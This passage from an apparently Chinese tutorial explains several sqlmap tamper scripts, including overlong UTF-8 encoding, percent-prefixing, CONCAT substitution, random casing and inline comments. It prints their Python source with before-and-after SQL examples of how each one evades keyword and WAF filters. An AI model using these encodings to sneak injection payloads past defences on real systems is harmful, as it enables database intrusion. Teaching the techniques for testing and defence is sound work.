class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += payload[i:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> payload[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (string.ascii_letters + string.digits):<br>                retVal += <span class="hljs-string">&quot;%%%.2X%%%.2X&quot;</span> % (<span class="hljs-number">0xc0</span> + (<span class="hljs-built_in">ord</span>(payload[i]) &gt;&gt; <span class="hljs-number">6</span>), <span class="hljs-number">0x80</span> + (<span class="hljs-built_in">ord</span>(payload[i]) &amp; <span class="hljs-number">0x3f</span>))<br>            <span class="hljs-keyword">else</span>:<br>                retVal += payload[i]<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将给定payload中的所有非字母数字的字符转换为超长的UTF8（例如-quot-gt-C0-A7）。"><a href="#1-作用：将给定payload中的所有非字母数字的字符转换为超长的UTF8（例如-quot-gt-C0-A7）。" class="headerlink" title="1.作用：将给定payload中的所有非字母数字的字符转换为超长的UTF8（例如&quot;-&gt;%C0%A7）。"></a>1.作用：将给定payload中的所有非字母数字的字符转换为超长的UTF8（例如<code>&quot;</code>-&gt;%C0%A7）。</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">SELECT</span> FIELD <span class="hljs-meta">FROM</span> <span class="hljs-meta">TABLE</span> <span class="hljs-meta">WHERE</span> 2&gt;1 <br>-----&gt;<span class="hljs-meta">SELECT</span><span class="hljs-name">%C0</span><span class="hljs-name">%A0FIELD</span><span class="hljs-name">%C0</span><span class="hljs-name">%A0FROM</span><span class="hljs-name">%C0</span><span class="hljs-name">%A0TABLE</span><span class="hljs-name">%C0</span><span class="hljs-name">%A0WHERE</span><span class="hljs-name">%C0</span><span class="hljs-name">%A02</span><span class="hljs-name">%C0</span><span class="hljs-name">%BE1</span><br></code></pre></td></tr></table></figure>




<h2 id="30-overlongutf8more-py"><a href="#30-overlongutf8more-py" class="headerlink" title="30.overlongutf8more.py"></a>30.overlongutf8more.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += payload[i:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += <span class="hljs-string">&quot;%%%.2X%%%.2X&quot;</span> % (<span class="hljs-number">0xc0</span> + (<span class="hljs-built_in">ord</span>(payload[i]) &gt;&gt; <span class="hljs-number">6</span>), <span class="hljs-number">0x80</span> + (<span class="hljs-built_in">ord</span>(payload[i]) &amp; <span class="hljs-number">0x3f</span>))<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将给定的payload中的所有字符转换为超长的UTF8"><a href="#1-作用：将给定的payload中的所有字符转换为超长的UTF8" class="headerlink" title="1.作用：将给定的payload中的所有字符转换为超长的UTF8"></a>1.作用：将给定的payload中的所有字符转换为超长的UTF8</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery">SELECT FIELD FROM TABLE WHERE <span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span><br><br>------&gt;<br><br><span class="hljs-meta">%C1</span><span class="hljs-meta">%93</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%85</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%85</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%83</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%94</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%86</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%89</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%85</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%84</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%86</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%92</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%8D</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%94</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%81</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%82</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%85</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%97</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%88</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%85</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%92</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%85</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%B2</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%BE</span><span class="hljs-meta">%C0</span><span class="hljs-meta">%B1</span><br></code></pre></td></tr></table></figure>




<h2 id="31-percentage-py"><a href="#31-percentage-py" class="headerlink" title="31.percentage.py"></a>31.percentage.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span class="hljs-keyword">in</span> string.hexdigits:<br>            retVal += payload[i:i + <span class="hljs-number">3</span>]<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> payload[i] != <span class="hljs-string">&#x27; &#x27;</span>:<br>            retVal += <span class="hljs-string">&#x27;%%%s&#x27;</span> % payload[i]<br>            i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            retVal += payload[i]<br>            i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：将给定的payload的所有字符前都加上-，用百分号来绕过关键字过滤"><a href="#1-作用：将给定的payload的所有字符前都加上-，用百分号来绕过关键字过滤" class="headerlink" title="1.作用：将给定的payload的所有字符前都加上%，用百分号来绕过关键字过滤"></a>1.作用：将给定的payload的所有字符前都加上<code>%</code>，用百分号来绕过关键字过滤</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">SELECT</span> -&gt; <span class="hljs-name">%S</span><span class="hljs-name">%E</span><span class="hljs-name">%L</span><span class="hljs-name">%E</span><span class="hljs-name">%C</span><span class="hljs-name">%T</span><br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-10"><a href="#2-要求：-10" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * ASP<br></code></pre></td></tr></table></figure>


<h2 id="32-plus2concat-py"><a href="#32-plus2concat-py" class="headerlink" title="32.plus2concat.py"></a>32.plus2concat.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    prefix, suffix = <span class="hljs-string">&#x27;+&#x27;</span> * <span class="hljs-built_in">len</span>(re.search(<span class="hljs-string">r&quot;\A(\+*)&quot;</span>, payload).group(<span class="hljs-number">0</span>)), <span class="hljs-string">&#x27;+&#x27;</span> * <span class="hljs-built_in">len</span>(re.search(<span class="hljs-string">r&quot;(\+*)\Z&quot;</span>, payload).group(<span class="hljs-number">0</span>))<br>    retVal = retVal.strip(<span class="hljs-string">&#x27;+&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        indexes = zeroDepthSearch(retVal, <span class="hljs-string">&#x27;+&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> indexes:<br>            first, last = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(indexes)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> retVal[indexes[<span class="hljs-number">0</span>]:indexes[i]]:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    last = i<br><br>            start = retVal[:indexes[first]].rfind(<span class="hljs-string">&#x27; &#x27;</span>) + <span class="hljs-number">1</span><br>            end = (retVal[indexes[last] + <span class="hljs-number">1</span>:].find(<span class="hljs-string">&#x27; &#x27;</span>) + indexes[last] + <span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> retVal[indexes[last] + <span class="hljs-number">1</span>:] <span class="hljs-keyword">else</span> <span class="hljs-built_in">len</span>(retVal) - <span class="hljs-number">1</span><br><br>            chars = [char <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> retVal]<br>            <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> indexes[first:last + <span class="hljs-number">1</span>]:<br>                chars[index] = <span class="hljs-string">&#x27;,&#x27;</span><br><br>            retVal = <span class="hljs-string">&quot;%sCONCAT(%s)%s&quot;</span> % (retVal[:start], <span class="hljs-string">&#x27;&#x27;</span>.join(chars)[start:end], retVal[end:])<br>        <span class="hljs-keyword">else</span>:<br>            match = re.search(<span class="hljs-string">r&quot;\((CHAR\(\d+.+\bCHAR\(\d+\))\)&quot;</span>, retVal)<br>            <span class="hljs-keyword">if</span> match:<br>                part = match.group(<span class="hljs-number">0</span>)<br>                indexes = <span class="hljs-built_in">set</span>(zeroDepthSearch(match.group(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;+&#x27;</span>))<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> indexes:<br>                    <span class="hljs-keyword">break</span><br>                chars = [char <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> part]<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(chars)):<br>                    <span class="hljs-keyword">if</span> i - <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> indexes:<br>                        chars[i] = <span class="hljs-string">&#x27;,&#x27;</span><br>                replacement = <span class="hljs-string">&quot;CONCAT%s&quot;</span> % <span class="hljs-string">&quot;&quot;</span>.join(chars)<br>                retVal = retVal.replace(part, replacement)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br><br>    retVal = <span class="hljs-string">&quot;%s%s%s&quot;</span> % (prefix, retVal, suffix)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用-concat-函数来替代加号，用于加号被过滤的情况"><a href="#1-作用：用-concat-函数来替代加号，用于加号被过滤的情况" class="headerlink" title="1.作用：用 concat 函数来替代加号，用于加号被过滤的情况"></a>1.作用：用 concat 函数来替代加号，用于加号被过滤的情况</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-type">CHAR</span>(<span class="hljs-number">113</span>)+<span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>)+<span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>) <span class="hljs-keyword">FROM</span> DUAL<br><span class="hljs-comment">----&gt;</span><br><span class="hljs-keyword">SELECT</span> CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">113</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)) <span class="hljs-keyword">FROM</span> DUAL<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-11"><a href="#2-要求：-11" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Requirements:</span><br>    <span class="hljs-string">*</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2012</span><span class="hljs-string">+</span><br></code></pre></td></tr></table></figure>




<h2 id="33-plus2fnconcat-py"><a href="#33-plus2fnconcat-py" class="headerlink" title="33.plus2fnconcat.py"></a>33.plus2fnconcat.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    prefix, suffix = <span class="hljs-string">&#x27;+&#x27;</span> * <span class="hljs-built_in">len</span>(re.search(<span class="hljs-string">r&quot;\A(\+*)&quot;</span>, payload).group(<span class="hljs-number">0</span>)), <span class="hljs-string">&#x27;+&#x27;</span> * <span class="hljs-built_in">len</span>(re.search(<span class="hljs-string">r&quot;(\+*)\Z&quot;</span>, payload).group(<span class="hljs-number">0</span>))<br>    retVal = retVal.strip(<span class="hljs-string">&#x27;+&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        indexes = zeroDepthSearch(retVal, <span class="hljs-string">&#x27;+&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> indexes:<br>            first, last = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(indexes)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> retVal[indexes[<span class="hljs-number">0</span>]:indexes[i]]:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    last = i<br><br>            start = retVal[:indexes[first]].rfind(<span class="hljs-string">&#x27; &#x27;</span>) + <span class="hljs-number">1</span><br>            end = (retVal[indexes[last] + <span class="hljs-number">1</span>:].find(<span class="hljs-string">&#x27; &#x27;</span>) + indexes[last] + <span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> retVal[indexes[last] + <span class="hljs-number">1</span>:] <span class="hljs-keyword">else</span> <span class="hljs-built_in">len</span>(retVal) - <span class="hljs-number">1</span><br><br>            count = <span class="hljs-number">0</span><br>            chars = [char <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> retVal]<br>            <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> indexes[first:last + <span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">if</span> count == <span class="hljs-number">0</span>:<br>                    chars[index] = <span class="hljs-string">&#x27;,&#x27;</span><br>                <span class="hljs-keyword">else</span>:<br>                    chars[index] = <span class="hljs-string">&#x27;\x01&#x27;</span><br>                count += <span class="hljs-number">1</span><br><br>            retVal = <span class="hljs-string">&quot;%s%s%s)&#125;%s&quot;</span> % (retVal[:start], <span class="hljs-string">&quot;&#123;fn CONCAT(&quot;</span> * count, <span class="hljs-string">&#x27;&#x27;</span>.join(chars)[start:end].replace(<span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-string">&quot;)&#125;,&quot;</span>), retVal[end:])<br>        <span class="hljs-keyword">else</span>:<br>            match = re.search(<span class="hljs-string">r&quot;\((CHAR\(\d+.+\bCHAR\(\d+\))\)&quot;</span>, retVal)<br>            <span class="hljs-keyword">if</span> match:<br>                part = match.group(<span class="hljs-number">0</span>)<br>                indexes = <span class="hljs-built_in">set</span>(zeroDepthSearch(match.group(<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;+&#x27;</span>))<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> indexes:<br>                    <span class="hljs-keyword">break</span><br><br>                count = <span class="hljs-number">0</span><br>                chars = [char <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> part]<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(chars)):<br>                    <span class="hljs-keyword">if</span> i - <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> indexes:<br>                        <span class="hljs-keyword">if</span> count == <span class="hljs-number">0</span>:<br>                            chars[i] = <span class="hljs-string">&#x27;,&#x27;</span><br>                        <span class="hljs-keyword">else</span>:<br>                            chars[i] = <span class="hljs-string">&#x27;\x01&#x27;</span><br>                        count += <span class="hljs-number">1</span><br><br>                replacement = <span class="hljs-string">&quot;%s%s&#125;&quot;</span> % ((<span class="hljs-string">&quot;&#123;fn CONCAT(&quot;</span> * count)[:-<span class="hljs-number">1</span>], <span class="hljs-string">&quot;&quot;</span>.join(chars).replace(<span class="hljs-string">&#x27;\x01&#x27;</span>, <span class="hljs-string">&quot;)&#125;,&quot;</span>))<br>                retVal = retVal.replace(part, replacement)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br><br>    retVal = <span class="hljs-string">&quot;%s%s%s&quot;</span> % (prefix, retVal, suffix)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：用（MsSQL）ODBC函数-fn-CONCAT（）-对应项替换加号运算符（“-”），用于-被过滤的情况"><a href="#1-作用：用（MsSQL）ODBC函数-fn-CONCAT（）-对应项替换加号运算符（“-”），用于-被过滤的情况" class="headerlink" title="1.作用：用（MsSQL）ODBC函数{fn CONCAT（）}对应项替换加号运算符（“+”），用于+被过滤的情况"></a>1.作用：用（MsSQL）ODBC函数{fn CONCAT（）}对应项替换加号运算符（“+”），用于<code>+</code>被过滤的情况</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> (<span class="hljs-type">CHAR</span>(<span class="hljs-number">113</span>)+<span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>)+<span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)) <span class="hljs-keyword">FROM</span> DUAL<br><span class="hljs-comment">-----&gt;</span><br><span class="hljs-keyword">SELECT</span> &#123;fn CONCAT(&#123;fn CONCAT(<span class="hljs-type">CHAR</span>(<span class="hljs-number">113</span>),<span class="hljs-type">CHAR</span>(<span class="hljs-number">114</span>))&#125;,<span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>))&#125; <span class="hljs-keyword">FROM</span> DUAL<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-12"><a href="#2-要求：-12" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Requirements:</span><br>    <span class="hljs-string">*</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2008</span><span class="hljs-string">+</span><br></code></pre></td></tr></table></figure>




<h2 id="34-randomcase-py"><a href="#34-randomcase-py" class="headerlink" title="34.randomcase.py"></a>34.randomcase.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;\b[A-Za-z_]+\b&quot;</span>, retVal):<br>        word = match.group()<br><br>        <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;%s(&quot;</span> % word) <span class="hljs-keyword">in</span> payload:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                _ = <span class="hljs-string">&quot;&quot;</span><br><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(word)):<br>                    _ += word[i].upper() <span class="hljs-keyword">if</span> randomRange(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">else</span> word[i].lower()<br><br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(_) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> _ <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (_.lower(), _.upper()):<br>                    <span class="hljs-keyword">break</span><br><br>            retVal = retVal.replace(word, _)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h2 id="1-作用：将-payload-随机大小写，可用于大小写绕过的情况。"><a href="#1-作用：将-payload-随机大小写，可用于大小写绕过的情况。" class="headerlink" title="1.作用：将 payload 随机大小写，可用于大小写绕过的情况。"></a>1.作用：将 payload 随机大小写，可用于大小写绕过的情况。</h2><h2 id="35-randomcomments-py"><a href="#35-randomcomments-py" class="headerlink" title="35.randomcomments.py"></a>35.randomcomments.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;\b[A-Za-z_]+\b&quot;</span>, payload):<br>        word = match.group()<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(word) &lt; <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords:<br>            _ = word[<span class="hljs-number">0</span>]<br><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(word) - <span class="hljs-number">1</span>):<br>                _ += <span class="hljs-string">&quot;%s%s&quot;</span> % (<span class="hljs-string">&quot;/**/&quot;</span> <span class="hljs-keyword">if</span> randomRange(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>, word[i])<br><br>            _ += word[-<span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/**/&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> _:<br>                index = randomRange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(word) - <span class="hljs-number">1</span>)<br>                _ = word[:index] + <span class="hljs-string">&quot;/**/&quot;</span> + word[index:]<br><br>            retVal = retVal.replace(word, _)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：在-payload-的关键字中间随机插入-，可用于绕过关键字过滤"><a href="#1-作用：在-payload-的关键字中间随机插入-，可用于绕过关键字过滤" class="headerlink" title="1.作用：在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤"></a>1.作用：在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">INSERT ----&gt;  I<span class="hljs-regexp">/**/</span>N<span class="hljs-regexp">/**/</span>SERT<br></code></pre></td></tr></table></figure>




